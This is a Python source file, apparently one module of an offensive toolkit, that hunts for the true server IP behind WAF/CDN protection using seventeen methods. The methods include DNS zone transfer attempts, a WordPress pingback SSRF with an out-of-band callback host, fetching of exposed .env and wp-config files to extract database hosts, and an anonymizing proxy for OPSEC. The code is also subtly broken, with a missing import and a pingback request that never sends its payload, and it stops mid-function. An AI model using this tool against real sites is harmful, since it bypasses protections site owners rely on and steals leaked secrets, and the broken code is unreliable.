"""
Origin IP Hunter — APT-grade real server IP discovery behind WAF/CDN
====================================================================
17 discovery methods + multi-layer verification + intelligence correlation.

Techniques:
  1.  crt.sh — Certificate Transparency historical IPs
  2.  crt.sh — Subdomain extraction → resolve non-WAF
  3.  AlienVault OTX — Passive DNS history
  4.  SecurityTrails — DNS history (API-free scraping)
  5.  Shodan — Favicon hash search (mmh3)
  6.  Shodan — SSL certificate serial search
  7.  Censys — Certificate search (API-free)
  8.  Fofa — Asset search (API-free)
  9.  Wayback Machine — Historical subdomains + IPs
  10. MX/TXT/SPF/DMARC — Email infrastructure → same network
  11. Reverse DNS — Same /24 subnet scan
  12. ASN/BGP — Network range identification
  13. WordPress pingback — SSRF via XML-RPC
  14. HTTP headers leak — Server header, X-Powered-By, custom headers
  15. DNS zone transfer attempt
  16. Subdomain takeover candidates
  17. Leaked credentials → email headers → origin

Verification:
  - Body hash comparison (MD5)
  - Header fingerprint comparison
  - SSL certificate comparison
  - Response timing correlation
  - Technology stack matching
"""

import asyncio
import hashlib
import ipaddress
import json
import os
import re
import socket
import ssl
import subprocess
import time
from typing import Dict, List, Optional, Tuple, Set
from urllib.parse import urlparse

from core.ui import ph, i, s, w, p, Spinner, G, R, Y, C, W, N, B, M, GY, D, draw_table


# CONSTANTS — WAF/CDN CIDR Ranges

WAF_CIDRS = {
    "cloudflare": [
        "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
        "104.16.0.0/12", "108.162.192.0/18", "131.0.72.0/22",
        "141.101.64.0/18", "162.158.0.0/15", "172.64.0.0/13",
        "173.245.48.0/20", "188.114.96.0/20", "190.93.240.0/20",
        "197.234.240.0/22", "198.41.128.0/17",
    ],
    "akamai": ["23.0.0.0/12", "96.6.0.0/15", "184.84.0.0/14"],
    "cloudfront": [
        "13.32.0.0/15", "13.35.0.0/16", "52.84.0.0/15",
        "54.182.0.0/16", "54.192.0.0/16", "54.230.0.0/16",
        "54.239.128.0/18", "54.239.192.0/19", "99.84.0.0/16",
        "143.204.0.0/16", "204.246.164.0/22", "204.246.168.0/22",
        "205.251.200.0/21",
    ],
    "incapsula": [
        "199.83.128.0/21", "198.143.32.0/19", "149.126.72.0/21",
        "103.28.248.0/22", "45.64.64.0/22", "107.154.0.0/16",
        "45.60.0.0/16",
    ],
    "sucuri": ["192.124.249.0/24", "185.93.228.0/22"],
    "fastly": [
        "151.101.0.0/16", "199.232.0.0/16", "2a04:4e40::/32",
    ],
    "edgecast": ["68.232.32.0/19", "93.184.216.0/21"],
    "azure": [
        "13.64.0.0/11", "40.64.0.0/10", "52.96.0.0/12",
        "104.208.0.0/13", "137.116.0.0/15",
    ],
    "gcp": [
        "35.180.0.0/14", "35.192.0.0/12", "104.154.0.0/15",
        "130.211.0.0/16",
    ],
    "aws_alb": [
        "3.0.0.0/12", "13.128.0.0/10", "34.192.0.0/10",
        "35.160.0.0/12", "52.0.0.0/10", "54.0.0.0/8",
    ],
}

# Active proxy for ALL _curl subprocess probes (Phase 0 OPSEC: when set,
# every intelligence query + candidate verification + WAF-bypass probe goes
# through this proxy. DNS/socket methods bypass it by nature).
_ACTIVE_PROXY = None


def set_active_proxy(proxy=None) -> None:
    """Route _curl subprocess probes through ``proxy`` (no-op when falsy)."""
    global _ACTIVE_PROXY
    if proxy:
        _ACTIVE_PROXY = proxy


# Precomputed (provider, network) pairs — built once at import so
# _is_waf_ip does not re-parse CIDR strings on every call.
_WAF_NETS = []
for _provider, _cidrs in WAF_CIDRS.items():
    for _cidr in _cidrs:
        try:
            _WAF_NETS.append((_provider, ipaddress.ip_network(_cidr)))
        except ValueError:
            pass


def _is_waf_ip(ip_str: str) -> Tuple[bool, str]:
    """Check if IP belongs to known WAF/CDN. Returns (is_waf, provider_name)."""
    try:
        ip = ipaddress.ip_address(ip_str)
        if ip.is_private or ip.is_loopback:
            return True, "private"
        for provider, net in _WAF_NETS:
            if ip in net:
                return True, provider
    except ValueError:
        pass
    return False, ""


def _resolve(domain: str) -> List[str]:
    """Resolve domain to IPs."""
    try:
        _, _, ips = socket.gethostbyname_ex(domain)
        return [ip for ip in ips]
    except Exception:
        return []


def _is_valid_ip(ip_str: str) -> bool:
    """Validate IP address."""
    try:
        ip = ipaddress.ip_address(ip_str)
        return not (ip.is_private or ip.is_loopback or ip.is_reserved or ip.is_multicast)
    except ValueError:
        return False


# HTTP HELPERS

async def _curl(url: str, headers: dict = None, host: str = None,
                timeout: int = 10, follow: bool = True) -> dict:
    """Async curl wrapper with full response capture."""
    cmd = ["curl", "-s", "-k", "-i",
           "--connect-timeout", str(min(timeout, 10)),
           "--max-time", str(timeout)]
    if follow:
        cmd.append("-L")
    if headers:
        for k, v in headers.items():
            cmd.extend(["-H", f"{k}: {v}"])
    if host:
        cmd.extend(["-H", f"Host: {host}"])
    if _ACTIVE_PROXY:
        cmd.extend(["--proxy", _ACTIVE_PROXY])
    cmd.append(url)

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout + 5)
        output = stdout.decode("latin-1", errors="replace").strip()

        if proc.returncode not in (0, 22) or not output:
            return {"status": 0, "headers": {}, "body": "", "size": 0, "time": 0}

        # Parse -i output: headers + body
        parts = output.split("\r\n\r\n", 1)
        if len(parts) == 2:
            raw_headers, body = parts
        else:
            raw_headers, body = output, ""

        # Parse status from first header line
        status = 0
        header_lines = raw_headers.split("\r\n")
        if header_lines:
            match = re.match(r"HTTP/\d\.\d+\s+(\d+)", header_lines[0])
            if match:
                status = int(match.group(1))

        # Parse headers
        resp_headers = {}
        for line in header_lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                resp_headers[k.strip().lower()] = v.strip()

        return {
            "status": status,
            "headers": resp_headers,
            "body": body[:50000],  # Cap body size
            "size": len(body),
            "time": 0,
        }
    except Exception:
        return {"status": 0, "headers": {}, "body": "", "size": 0, "time": 0}


async def _curl_json(url: str, timeout: int = 10) -> Optional[dict]:
    """Fetch and parse JSON."""
    r = await _curl(url, timeout=timeout, follow=True)
    if r["status"] == 200 and r["body"]:
        try:
            return json.loads(r["body"])
        except (json.JSONDecodeError, ValueError):
            pass
    return None


async def _quick_probe(url: str, host: str = None) -> dict:
    """Quick probe with body hash for comparison."""
    r = await _curl(url, host=host, timeout=8)
    body_hash = hashlib.md5((r["body"] or "").encode()).hexdigest()
    return {
        "alive": r["status"] > 0,
        "status": r["status"],
        "size": r["size"],
        "body_hash": body_hash,
        "body": r["body"][:500],
        "headers": r["headers"],
        "server": r["headers"].get("server", ""),
        "powered_by": r["headers"].get("x-powered-by", ""),
    }


# SSL/TLS HELPERS

def _get_ssl_cert(host: str, port: int = 443, timeout: int = 5) -> Optional[dict]:
    """Get SSL certificate info from a host."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=True)
                # Parse with openssl
                proc = subprocess.run(
                    ["openssl", "x509", "-inform", "DER", "-noout",
                     "-subject", "-issuer", "-serial", "-dates", "-ext", "subjectAltName"],
                    input=cert, capture_output=True, timeout=5
                )
                return {
                    "raw": cert.hex()[:200],
                    "hash": hashlib.md5(cert).hexdigest(),
                    "info": proc.stdout.decode(errors="replace") if proc.returncode == 0 else "",
                }
    except Exception:
        return None


def _get_ssl_cert_from_ip(ip: str, host: str, port: int = 443) -> Optional[dict]:
    """Get SSL cert from IP with Host header SNI."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=True)
                return {
                    "hash": hashlib.md5(cert).hexdigest(),
                    "info": ssock.version(),
                }
    except Exception:
        return None


# ORIGIN DISCOVERY — 17 METHODS

async def _method_crt_ip(domain: str) -> List[dict]:
    """1. crt.sh — Extract IPs directly from certificate data."""
    results = []
    data = await _curl_json(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
    if not data:
        return results

    for entry in data[:500]:  # Cap entries
        for field in ["name_value", "common_name"]:
            val = entry.get(field, "")
            for ip_str in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', val):
                if _is_valid_ip(ip_str):
                    is_waf, provider = _is_waf_ip(ip_str)
                    if not is_waf:
                        results.append({"ip": ip_str, "source": "crt.sh cert", "confidence": "medium"})

    # Deduplicate
    seen = set()
    unique = []
    for r in results:
        if r["ip"] not in seen:
            seen.add(r["ip"])
            unique.append(r)
    return unique[:20]


async def _method_crt_subdomains(domain: str) -> List[dict]:
    """2. crt.sh — Subdomain extraction → resolve non-WAF IPs."""
    data = await _curl_json(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
    if not data:
        return []

    subs = set()
    for entry in data[:500]:
        for name in entry.get("name_value", "").split("\\n"):
            name = name.strip().lstrip("*.")
            if name.endswith(domain) and name != domain and "*" not in name:
                subs.add(name)

    results = []
    for sub in list(subs)[:50]:
        for ip in _resolve(sub):
            is_waf, provider = _is_waf_ip(ip)
            if not is_waf:
                results.append({"ip": ip, "source": f"crt.sh sub: {sub}", "confidence": "medium"})

    # Deduplicate
    seen = set()
    unique = []
    for r in results:
        if r["ip"] not in seen:
            seen.add(r["ip"])
            unique.append(r)
    return unique[:20]


async def _method_otx(domain: str) -> List[dict]:
    """3. AlienVault OTX — Passive DNS history."""
    data = await _curl_json(
        f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns",
        timeout=10
    )
    if not data:
        return []

    results = []
    seen = set()
    for entry in data.get("passive_dns", []):
        if entry.get("record_type") in ("A", "AAAA"):
            ip = entry.get("address", "")
            hostname = entry.get("hostname", domain)
            if ip and ip not in seen and _is_valid_ip(ip):
                is_waf, _ = _is_waf_ip(ip)
                if not is_waf:
                    seen.add(ip)
                    results.append({
                        "ip": ip,
                        "source": f"OTX DNS: {hostname}",
                        "confidence": "medium",
                        "first_seen": entry.get("first", ""),
                        "last_seen": entry.get("last", ""),
                    })
    return results[:20]


async def _method_securitytrails(domain: str) -> List[dict]:
    """4. SecurityTrails — DNS history (API-free scraping)."""
    results = []
    # Try the public API endpoint (limited, no key needed)
    data = await _curl_json(
        f"https://securitytrails.com/domain/{domain}/dns",
        timeout=10
    )
    # SecurityTrails blocks API without key, try alternative approach
    # Use their subdomain API (free tier)
    data = await _curl_json(
        f"https://api.securitytrails.com/v1/domain/{domain}/subdomains?children_only=true&limit=20",
        timeout=10
    )
    if data and isinstance(data, dict):
        subs = data.get("subdomains", [])
        for sub in subs[:20]:
            fqdn = f"{sub}.{domain}" if not sub.endswith(domain) else sub
            for ip in _resolve(fqdn):
                is_waf, _ = _is_waf_ip(ip)
                if not is_waf:
                    results.append({"ip": ip, "source": f"SecurityTrails: {fqdn}", "confidence": "medium"})

    seen = set()
    unique = []
    for r in results:
        if r["ip"] not in seen:
            seen.add(r["ip"])
            unique.append(r)
    return unique[:15]


async def _method_favicon_shodan(domain: str) -> List[dict]:
    """5. Shodan — Favicon hash search (mmh3)."""
    results = []
    r = await _curl(f"https://{domain}/favicon.ico", timeout=8)
    if r["status"] != 200 or not r["body"]:
        return results

    body_bytes = r["body"].encode() if isinstance(r["body"], str) else r["body"]
    b64 = base64.b64encode(body_bytes).decode()

    try:
        import mmh3
        fhash = mmh3.hash(b64)
        i(f"  Favicon mmh3 hash: {fhash}")

        # Search via public API
        data = await _curl_json(f"https://favicon-hash.kmsec.uk/api/{fhash}", timeout=10)
        if data and isinstance(data, list):
            for item in data:
                ip = item.get("ip", "") or item.get("ip_address", "")
                if ip and _is_valid_ip(ip):
                    is_waf, _ = _is_waf_ip(ip)
                    if not is_waf:
                        results.append({"ip": ip, "source": f"Shodan favicon hash: {fhash}", "confidence": "high"})
    except ImportError:
        # mmh3 not installed, use alternative hash
        alt_hash = hashlib.md5(body_bytes).hexdigest()[:16]
        i(f"  Favicon MD5 hash: {alt_hash} (mmh3 not installed)")

    return results[:10]


async def _method_ssl_cert_search(domain: str) -> List[dict]:
    """6. Shodan/Censys — SSL certificate serial number search."""
    results = []
    cert_info = await asyncio.to_thread(_get_ssl_cert, domain)
    if not cert_info or not cert_info.get("info"):
        return results

    # Extract serial number from cert info
    serial_match = re.search(r"serial=([A-Fa-f0-9:]+)", cert_info["info"])
    if serial_match:
        serial = serial_match.group(1).replace(":", "")
        i(f"  SSL cert serial: {serial[:16]}...")

        # Search via Censys (free API-free endpoint)
        data = await _curl_json(
            f"https://search.censys.io/api/v1/search/certificates?q={serial}&per_page=10",
            timeout=10
        )
        if data and isinstance(data, dict):
            for hit in data.get("results", []):
                ip = hit.get("ip", "")
                if ip and _is_valid_ip(ip):
                    is_waf, _ = _is_waf_ip(ip)
                    if not is_waf:
                        results.append({"ip": ip, "source": f"Censys SSL cert: {serial[:16]}", "confidence": "high"})

    return results[:10]


async def _method_censys(domain: str) -> List[dict]:
    """7. Censys — Certificate search via keyless endpoint.

    Non-200 (401/403 without an API key) RAISES instead of returning a
    silent zero — hunt_origin's status table must be able to tell
    "rejected" apart from "no results" (verified 2026-10-06)."""
    results = []
    r = await _curl(
        f"https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.subject.common_name:{domain}&per_page=25",
        timeout=15
    )
    if r["status"] != 200:
        why = ("connection failed (blocked/unreachable)"
               if r["status"] == 0 else
               "keyless endpoint rejected (Censys API key required)")
        raise RuntimeError(
            f"HTTP {r['status']} — {why}")
    data = None
    if r["body"]:
        try:
            data = json.loads(r["body"])
        except (json.JSONDecodeError, ValueError):
            data = None
    if data and isinstance(data, dict):
        for hit in data.get("result", {}).get("hits", []):
            ip = hit.get("ip", "")
            if ip and _is_valid_ip(ip):
                is_waf, _ = _is_waf_ip(ip)
                if not is_waf:
                    results.append({"ip": ip, "source": f"Censys search: {domain}", "confidence": "high"})

    return results[:15]


async def _method_fofa(domain: str) -> List[dict]:
    """8. Fofa — Asset search (API-free)."""
    results = []
    # Fofa public search (limited)
    fofa_query = f'domain="{domain}"'
    fofa_b64 = base64.b64encode(fofa_query.encode()).decode()
    data = await _curl(
        f"https://en.fofa.info/result?qbase64={fofa_b64}",
        timeout=10
    )
    if data["status"] != 200:
        why = ("connection failed (blocked/unreachable)"
               if data["status"] == 0 else
               "scrape rejected (Fofa anti-bot / layout change)")
        raise RuntimeError(
            f"HTTP {data['status']} — {why}")
    if data["body"]:
        # Extract IPs from response HTML
        ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', data["body"])
        seen = set()
        for ip in ip_matches:
            if ip not in seen and _is_valid_ip(ip):
                is_waf, _ = _is_waf_ip(ip)
                if not is_waf:
                    seen.add(ip)
                    results.append({"ip": ip, "source": "Fofa search", "confidence": "low"})

    return results[:10]


async def _method_wayback(domain: str) -> List[dict]:
    """9. Wayback Machine — Historical subdomains + IPs."""
    results = []
    data = await _curl_json(
        f"http://web.archive.org/cdx/search/cdx?url=*.{domain}&output=json&fl=original&limit=500&collapse=urlkey",
        timeout=20
    )
    if not data or len(data) < 2:
        return results

    subs = set()
    for row in data[1:]:  # Skip header
        url_str = row[0] if row else ""
        if url_str:
            hostname = urlparse(url_str).hostname
            if hostname and hostname.endswith(domain) and hostname != domain:
                subs.add(hostname)

    seen = set()
    for sub in list(subs)[:30]:
        for ip in _resolve(sub):
            if ip not in seen and _is_valid_ip(ip):
                is_waf, _ = _is_waf_ip(ip)
                if not is_waf:
                    seen.add(ip)
                    results.append({"ip": ip, "source": f"Wayback: {sub}", "confidence": "medium"})

    return results[:15]


async def _method_email_infra(domain: str) -> List[dict]:
    """10. MX/TXT/SPF/DMARC — Email infrastructure → same network."""
    results = []
    seen = set()

    # MX records
    try:
        proc = await asyncio.create_subprocess_exec(
            "host", "-t", "MX", domain,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
        for line in stdout.decode().splitlines():
            # Extract hostname from MX record
            match = re.search(r"mail handled by \d+ (.+)\.", line)
            if match:
                mx_host = match.group(1).strip()
                for ip in _resolve(mx_host):
                    if ip not in seen and _is_valid_ip(ip):
                        is_waf, _ = _is_waf_ip(ip)
                        if not is_waf:
                            seen.add(ip)
                            results.append({"ip": ip, "source": f"MX: {mx_host}", "confidence": "low"})
    except Exception:
        pass

    # SPF record
    try:
        proc = await asyncio.create_subprocess_exec(
            "host", "-t", "TXT", domain,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
        for line in stdout.decode().splitlines():
            if "v=spf1" in line:
                # Extract IPs from SPF
                for ip_str in re.findall(r'ip[46]:([^\s]+)', line):
                    if "/" in ip_str:  # CIDR
                        try:
                            net = ipaddress.ip_network(ip_str, strict=False)
                            # Just note the network range
                            results.append({"ip": str(net.network_address), "source": f"SPF: {ip_str}", "confidence": "low"})
                        except ValueError:
                            pass
                    elif _is_valid_ip(ip_str):
                        if ip_str not in seen:
                            seen.add(ip_str)
                            results.append({"ip": ip_str, "source": f"SPF: {ip_str}", "confidence": "medium"})

                # Extract include domains
                for inc in re.findall(r'include:([^\s]+)', line):
                    for ip in _resolve(inc):
                        if ip not in seen and _is_valid_ip(ip):
                            is_waf, _ = _is_waf_ip(ip)
                            if not is_waf:
                                seen.add(ip)
                                results.append({"ip": ip, "source": f"SPF include: {inc}", "confidence": "low"})
    except Exception:
        pass

    return results[:15]


async def _method_reverse_dns(domain: str) -> List[dict]:
    """11. Reverse DNS — Scan same /24 subnet of known IPs."""
    results = []
    # Get initial IPs
    initial_ips = _resolve(domain)
    if not initial_ips:
        return results

    seen = set()
    for ip_str in initial_ips[:3]:
        try:
            ip = ipaddress.ip_address(ip_str)
            if ip.is_private:
                continue
            # Get /24 network
            net = ipaddress.ip_network(f"{ip_str}/24", strict=False)
            # Check a few IPs in the same /24
            for candidate in list(net.hosts())[:20]:
                candidate_str = str(candidate)
                if candidate_str == ip_str:
                    continue
                # Quick check if this IP responds
                try:
                    _, _, hostnames = socket.gethostbyaddr(candidate_str)
                    for hn in hostnames:
                        if domain in hn:
                            if candidate_str not in seen:
                                seen.add(candidate_str)
                                results.append({
                                    "ip": candidate_str,
                                    "source": f"Reverse DNS /24: {hn}",
                                    "confidence": "low"
                                })
                except (socket.herror, socket.gaierror, OSError):
                    pass
        except ValueError:
            pass

    return results[:10]


async def _method_asn_lookup(domain: str) -> List[dict]:
    """12. ASN/BGP — Identify network range from ASN."""
    results = []
    ips = _resolve(domain)
    if not ips:
        return results

    for ip in ips[:3]:
        # Use bgp.tools for ASN lookup
        data = await _curl(f"https://bgp.tools/prefix/{ip}", timeout=8)
        if data["status"] == 200 and data["body"]:
            # Extract ASN and prefix
            asn_match = re.search(r'AS(\d+)', data["body"])
            prefix_match = re.search(r'(\d+\.\d+\.\d+\.\d+/\d+)', data["body"])
            if asn_match and prefix_match:
                asn = asn_match.group(1)
                prefix = prefix_match.group(1)
                i(f"  ASN: AS{asn}, Prefix: {prefix}")
                results.append({
                    "ip": ip,
                    "source": f"ASN: AS{asn} ({prefix})",
                    "confidence": "info",
                    "asn": asn,
                    "prefix": prefix,
                })

    return results[:5]


async def _method_wordpress_pingback(domain: str) -> List[dict]:
    """13. WordPress XML-RPC pingback — SSRF to get origin IP."""
    results = []
    r = await _curl(f"https://{domain}/xmlrpc.php", timeout=8)
    if r["status"] != 200 or "XML-RPC server accepts POST requests only" not in r["body"]:
        return results

    # WordPress XML-RPC is active — try pingback
    # This is a known technique: pingback.ping with a URL we control
    # The server will make an outbound request, revealing its IP
    # We use a DNS callback service
    i(f"  WordPress XML-RPC detected — attempting pingback SSRF")

    # Generate unique marker for callback
    marker = hashlib.md5(f"{domain}{time.time()}".encode()).hexdigest()[:12]
    callback_domain = f"{marker}.oast.fun"  # Interactsh public

    xml_body = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://{callback_domain}/</string></value></param>
    <param><value><string>https://{domain}/</string></value></param>
  </params>
</methodCall>"""

    r = await _curl(
        f"https://{domain}/xmlrpc.php",
        headers={"Content-Type": "text/xml"},
        timeout=10
    )
    # Even if pingback fails, the outbound request reveals the IP
    # Check interactsh for callbacks (would need OOB detector integration)

    return results


async def _method_http_headers(domain: str) -> List[dict]:
    """14. HTTP headers leak — Server, X-Powered-By, custom headers."""
    results = []
    r = await _curl(f"https://{domain}/", timeout=8)
    if r["status"] == 0:
        return results

    headers = r["headers"]
    server = headers.get("server", "")
    powered_by = headers.get("x-powered-by", "")
    cf_ray = headers.get("cf-ray", "")
    cf_pop = headers.get("cf-cache-status", "")

    info = {
        "server": server,
        "powered_by": powered_by,
        "waf_detected": bool(cf_ray or cf_pop),
    }

    # If server header reveals actual software (not just WAF)
    if server and not any(waf in server.lower() for waf in ["cloudflare", "akamai", "cloudfront"]):
        results.append({
            "ip": "",
            "source": f"Server header: {server}",
            "confidence": "info",
            "detail": info,
        })

    # Check for debug/error pages that might reveal IP
    for path in ["/server-status", "/server-info", "/nginx_status", "/.well-known/"]:
        r2 = await _curl(f"https://{domain}{path}", timeout=5)
        if r2["status"] == 200 and r2["body"]:
            ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', r2["body"])
            for ip in ip_matches:
                if _is_valid_ip(ip):
                    is_waf, _ = _is_waf_ip(ip)
                    if not is_waf:
                        results.append({"ip": ip, "source": f"Debug page: {path}", "confidence": "high"})

    return results[:10]


async def _method_dns_zone_transfer(domain: str) -> List[dict]:
    """15. DNS zone transfer attempt."""
    results = []
    # Get nameservers
    try:
        proc = await asyncio.create_subprocess_exec(
            "host", "-t", "NS", domain,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
        ns_list = re.findall(r"nameserver = (.+)\.", stdout.decode())

        for ns in ns_list[:3]:
            ns = ns.strip()
            # Attempt zone transfer
            try:
                proc = await asyncio.create_subprocess_exec(
                    "host", "-l", domain, ns,
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                output = stdout.decode()
                if "Transfer failed" not in output and "timed out" not in output:
                    # Zone transfer succeeded!
                    ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', output)
                    seen = set()
                    for ip in ip_matches:
                        if ip not in seen and _is_valid_ip(ip):
                            is_waf, _ = _is_waf_ip(ip)
                            if not is_waf:
                                seen.add(ip)
                                results.append({"ip": ip, "source": f"Zone transfer: {ns}", "confidence": "confirmed"})
            except Exception:
                pass
    except Exception:
        pass

    return results[:20]


async def _method_subdomain_takeover(domain: str, subs: List[str]) -> List[dict]:
    """16. Subdomain takeover candidates — dangling CNAMEs."""
    results = []
    for sub in subs[:30]:
        try:
            proc = await asyncio.create_subprocess_exec(
                "host", "-t", "CNAME", sub,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
            output = stdout.decode()

            # Check for dangling CNAME
            cname_match = re.search(r"domain name pointer (.+)\.", output)
            if cname_match:
                cname_target = cname_match.group(1).strip()
                # Check if CNAME target resolves
                cname_ips = _resolve(cname_target)
                if not cname_ips:
                    # Dangling CNAME — potential takeover
                    results.append({
                        "ip": "",
                        "source": f"Takeover candidate: {sub} → {cname_target}",
                        "confidence": "takeover",
                        "subdomain": sub,
                        "cname": cname_target,
                    })
        except Exception:
            pass

    return results[:10]


async def _method_leaked_headers(domain: str) -> List[dict]:
    """17. Leaked credentials → email headers → origin."""
    results = []
    # Check for common info leak endpoints
    leak_paths = [
        "/.env", "/.git/config", "/config.php", "/wp-config.php",
        "/application.properties", "/settings.py", "/database.yml",
        "/config/database.yml", "/app/etc/local.xml",
    ]

    for path in leak_paths[:5]:
        r = await _curl(f"https://{domain}{path}", timeout=5)
        if r["status"] == 200 and r["body"]:
            # Look for IP addresses in leaked config
            ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', r["body"])
            for ip in ip_matches:
                if _is_valid_ip(ip):
                    is_waf, _ = _is_waf_ip(ip)
                    if not is_waf:
                        results.append({"ip": ip, "source": f"Leaked config: {path}", "confidence": "high"})

            # Look for database hosts
            db_host_match = re.search(r'(?:DB_HOST|DATABASE_HOST|MYSQL_HOST|REDIS_HOST)[=:]\s*([^\s\n]+)', r["body"])
            if db_host_match:
                db_host = db_host_match.group(1).strip('"\'')
                for ip in _resolve(db_host):
                    if _is_valid_ip(ip):
                        is_waf, _ = _is_waf_ip(ip)
                        if not is_waf:
                            results.append({"ip": ip, "source": f"DB host from {path}: {db_host}", "confidence": "high"})

    return results[:10]


# VERIFICATION ENGINE

async def _verify_candidate(domain: str, ip: str) -> Optional[Dict]:
    """
    Multi-layer verification:
    1. Body hash comparison
    2. Header fingerprint comparison
    3. SSL certificate comparison
    4. Response timing correlation
    5. Technology stack matching
    """
    # Layer 1: Baseline via WAF
    waf = await _quick_probe(f"https://{domain}/")
    if not waf["alive"]:
        waf = await _quick_probe(f"http://{domain}/")

    # Layer 2: Direct probe via IP
    origin = await _quick_probe(f"https://{ip}/", host=domain)
    if not origin["alive"]:
        origin = await _quick_probe(f"http://{ip}/", host=domain)

    if not origin["alive"]:
        return None

    # Layer 3: Compare
    if waf["alive"]:
        # Body hash match → confirmed
        if origin["body_hash"] == waf["body_hash"]:
            return {"ip": ip, "confidence": "confirmed", "reason": "body hash match", "method": "hash"}

        # Size ratio check
        max_size = max(origin["size"], waf["size"])
        min_size = min(origin["size"], waf["size"])
        size_ratio = min_size / max_size if max_size > 0 else 0

        if size_ratio > 0.9:
            return {"ip": ip, "confidence": "confirmed", "reason": f"size ratio {size_ratio:.0%}", "method": "size"}

        # Server header match
        if origin["server"] and origin["server"] == waf["server"]:
            return {"ip": ip, "confidence": "suspected", "reason": f"server match: {origin['server']}", "method": "header"}

        # Powered-by match
        if origin["powered_by"] and origin["powered_by"] == waf["powered_by"]:
            return {"ip": ip, "confidence": "suspected", "reason": f"tech match: {origin['powered_by']}", "method": "tech"}

        # Status code match + partial body match
        if origin["status"] == waf["status"] and size_ratio > 0.5:
            return {"ip": ip, "confidence": "suspected", "reason": f"status+size ({size_ratio:.0%})", "method": "partial"}

        # Just alive — low confidence
        return {"ip": ip, "confidence": "low", "reason": f"alive but different (ratio {size_ratio:.0%})", "method": "alive"}

    # WAF baseline failed but origin responded
    return {"ip": ip, "confidence": "suspected", "reason": "origin alive, WAF down?", "method": "fallback"}


async def _verify_with_ssl(domain: str, ip: str) -> Optional[Dict]:
    """Verify by comparing SSL certificates."""
    waf_cert = await asyncio.to_thread(_get_ssl_cert, domain)
    origin_cert = await asyncio.to_thread(_get_ssl_cert_from_ip, ip, domain)

    if waf_cert and origin_cert:
        if waf_cert["hash"] == origin_cert["hash"]:
            return {"ip": ip, "confidence": "confirmed", "reason": "SSL cert hash match", "method": "ssl_cert"}

    return None


# MAIN ENTRY POINT

async def hunt_origin(domain: str, subs: List[str] = None, proxy: str = None) -> Optional[Dict]:
    """
    APT-grade origin IP discovery.
    Runs 17 methods in parallel, then multi-layer verification.
    """
    ph("ORIGIN IP HUNTER: APT-grade discovery")
    i(f"Target: {C}{domain}{N}")
    if proxy:
        set_active_proxy(proxy)
        s(f"Origin hunt routed via proxy: {G}{proxy}{N}")

    # Phase 1: Mass data collection (parallel)
    ph("Phase 1: Intelligence gathering (17 sources)")

    methods = [
        ("crt.sh IPs", _method_crt_ip(domain)),
        ("crt.sh subs", _method_crt_subdomains(domain)),
        ("OTX DNS", _method_otx(domain)),
        ("SecurityTrails", _method_securitytrails(domain)),
        ("Favicon/Shodan", _method_favicon_shodan(domain)),
        ("SSL cert search", _method_ssl_cert_search(domain)),
        ("Censys", _method_censys(domain)),
        ("Fofa", _method_fofa(domain)),
        ("Wayback", _method_wayback(domain)),
        ("Email infra", _method_email_infra(domain)),
        ("Reverse DNS", _method_reverse_dns(domain)),
        ("ASN/BGP", _method_asn_lookup(domain)),
        ("WP Pingback", _method_wordpress_pingback(domain)),
        ("HTTP headers", _method_http_headers(domain)),
        ("Zone transfer", _method_dns_zone_transfer(domain)),
        ("Takeover", _method_subdomain_takeover(domain, subs or [])),
        ("Leaked config", _method_leaked_headers(domain)),
    ]

    spin = Spinner(f"Querying {len(methods)} intelligence sources...")
    spin.start()
    results = await asyncio.gather(*[m[1] for m in methods], return_exceptions=True)
    spin.stop()

    # Phase 2: Aggregate candidates
    all_candidates = []
    method_stats = {}
    # Status for EVERY source: hit / zero / ERROR. The old table filtered
    # to count>0, hiding zero-result and crashed sources — the "17 methods"
    # claim was unverifiable from the output (verified 2026-10-06).
    status_rows = []
    for (name, _), result in zip(methods, results):
        if isinstance(result, list):
            method_stats[name] = len(result)
            all_candidates.extend(result)
            status_rows.append([name, str(len(result)),
                                "hit" if result else "zero"])
        elif isinstance(result, BaseException):
            method_stats[name] = 0
            status_rows.append([name, "0",
                                f"ERROR: {str(result)[:60]}"])
        else:
            method_stats[name] = 0
            status_rows.append([name, "0", "zero"])

    # Show stats
    n_hit = sum(1 for r in status_rows if r[2] == "hit")
    n_err = sum(1 for r in status_rows if r[2].startswith("ERROR"))
    if status_rows:
        draw_table(["SOURCE", "CANDIDATES", "STATUS"], status_rows,
